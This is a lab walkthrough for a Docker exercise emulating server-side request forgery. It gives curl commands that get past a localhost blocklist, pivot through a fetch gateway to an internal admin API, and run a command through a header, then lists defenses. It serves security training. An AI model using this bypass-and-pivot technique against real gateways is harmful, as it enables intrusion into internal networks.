# Scenario 2: Server-Side Request Forgery (SSRF) to Internal RCE

This scenario replicates the mechanics of high-profile Zero-Days (e.g., ProxyNotShell, Ivanti Connect Secure, Citrix Bleed) where attackers use an edge device (like a VPN gateway) to forge requests into the internal network.

## The Goal
Bypass an external-facing proxy to reach a hidden, internal-only admin API and execute commands.

## Step 1: Spin Up the Lab
```bash
cd lab_infra
docker-compose up -d
```

## Step 2: The Attack (Adversary Emulation)
Access the attacker node:
```bash
docker-compose exec attacker_node bash
```

### 1. Identify the SSRF Vulnerability
The `ssrf_gateway` (port 5001) allows users to fetch external URLs.
```bash
curl "http://ssrf_gateway:5001/fetch?url=http://example.com"
```

### 2. Attempt to reach internal services (Blocked)
Attackers often try to reach `localhost` or metadata endpoints.
```bash
curl "http://ssrf_gateway:5001/fetch?url=http://localhost"
# Output: Access denied: Localhost is forbidden.
```

### 3. Bypass the Filter & Exploit
The filter blocks `localhost` and `127.0.0.1`, but not internal Docker hostnames or alternative IP representations.
We know there is an `internal_admin_api` service. Let's forge a request to it!
```bash
curl -H "Cmd: id" "http://ssrf_gateway:5001/fetch?url=http://internal_admin_api"
```
**Boom!** You successfully used the SSRF gateway to pivot into the internal network and achieved Remote Code Execution (RCE) on the admin API.

## Step 3: The Defense
How do we stop SSRF?
1. **Network Segmentation:** Ensure edge gateways cannot route traffic to sensitive internal management APIs.
2. **Strict Allow-lists:** Do not use blocklists (like blocking "localhost"). Instead, only allow specific domains (Allow-list).
3. **Authentication:** The internal API should still require authentication, even if the request comes from an "internal" IP.
